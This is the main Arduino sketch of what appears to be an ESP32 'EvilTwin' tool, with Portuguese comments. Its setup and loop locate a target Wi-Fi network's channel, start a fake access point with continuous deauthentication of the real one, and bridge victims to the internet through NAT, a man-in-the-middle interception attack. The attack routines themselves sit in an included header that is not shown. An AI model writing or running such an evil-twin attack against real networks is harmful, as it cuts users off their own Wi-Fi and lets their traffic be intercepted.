#include "funcoes_evtw.h"

void setup() {
    Serial.begin(9600); 
    delay(2000); 
    Serial.println("\n=== Iniciando EvilTwin-Esp32 (Proxy/Repetidor) ===");

    // 1. Descobre onde está o alvo
    buscarCanalAlvo(); 
    
    // 2. Sobe o AP Falso e começa a interceptar (Deauth)
    configurarDeauth(); 

    // 3. Conecta o ESP32 na internet real e ativa o NAT
    configurarRepetidor(); 
}

void loop() {
    // Roda o ataque continuamente
    loopDeauth();
    
    // Monitora a internet do ESP32
    loopRepetidor();
    
    delay(10); 
}